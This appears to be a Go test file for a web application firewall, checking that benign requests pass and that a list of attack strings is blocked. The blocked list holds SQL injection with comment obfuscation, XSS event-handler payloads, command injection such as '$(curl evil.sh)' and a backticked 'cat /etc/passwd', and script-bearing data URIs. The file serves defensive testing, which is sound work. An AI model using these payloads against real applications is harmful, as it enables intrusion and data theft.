package waf

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// TestBenignTrafficAllowed is a false-positive regression corpus: ordinary
// requests real applications send must pass the default ruleset. Every entry
// here was either observed as a false positive or guards a pattern that was
// deliberately narrowed (see rules.go comments).
func TestBenignTrafficAllowed(t *testing.T) {
	handler := newTestMiddleware(t)

	t.Run("query strings", func(t *testing.T) {
		queries := []string{
			// Params starting with "on" used to trip the bare on\w+= XSS rule.
			"/list?only=true",
			"/poll?once=1",
			"/status?online=yes",
			"/signup?onboarding=start",
			"/toggle?on=1",
			// Bare hex literals: web3 addresses, tx hashes, color values.
			"/tx?hash=0xdeadbeef42",
			"/account?addr=0x742d35cc6634c0532925a3b844bc454e4438f44e",
			// Benign data URIs.
			"/render?icon=data:image/png;base64,iVBORw0KGgo=",
			// Search phrases with spaces.
			"/search?q=cats+only=please",
			"/search?q=switch+it+on+and+off",
		}
		for _, q := range queries {
			r := httptest.NewRequest(http.MethodGet, q, nil)
			assertAllowed(t, handler, r)
		}
	})

	t.Run("text bodies", func(t *testing.T) {
		bodies := []struct {
			name        string
			contentType string
			body        string
		}{
			{"css comment", "text/css", "/* header layout */ .nav { color: red }"},
			{"markdown code span", "application/json", `{"comment":"run ` + "`make build`" + ` before pushing"}`},
			{"jquery snippet", "application/json", `{"snippet":"$(document).ready(init)"}`},
			{"code review note", "application/json", `{"note":"/* TODO: refactor */ keep the loop"}`},
			{"inline png", "application/json", `{"avatar":"data:image/png;base64,iVBORw0KGgo="}`},
			{"form with on-param", "application/x-www-form-urlencoded", "only=true&once=1&notify=on"},
		}
		for _, b := range bodies {
			t.Run(b.name, func(t *testing.T) {
				r := httptest.NewRequest(http.MethodPost, "/submit", strings.NewReader(b.body))
				r.Header.Set("Content-Type", b.contentType)
				assertAllowed(t, handler, r)
			})
		}
	})
}

// TestNarrowedRulesStillCatchAttacks verifies the tightened patterns keep
// matching the attack shapes they were narrowed around.
func TestNarrowedRulesStillCatchAttacks(t *testing.T) {
	handler := newTestMiddleware(t)
	attacks := []string{
		// Comment-obfuscated SQL keywords (no whitespace, comment as separator).
		"/api?q=1/**/UNION/**/SELECT/**/password/**/FROM/**/users",
		"/api?q=UNION/*x*/SELECT",
		// Event handler inside a tag and attribute breakout.
		"/page?x=<img+src=x+onerror=alert(1)>",
		"/page?x=%22+onmouseover%3Dprompt(1)",
		// Command substitution and backticked commands.
		"/api?cmd=$(curl+evil.sh)",
		"/api?cmd=%60cat+/etc/passwd%60",
		// Script-capable data URIs.
		"/page?x=data:text/html;base64,PHNjcmlwdD4=",
		"/page?x=data:image/svg%2bxml;base64,PHN2Zz4=",
	}
	for _, a := range attacks {
		r := httptest.NewRequest(http.MethodGet, a, nil)
		assertBlocked(t, handler, r)
	}
}
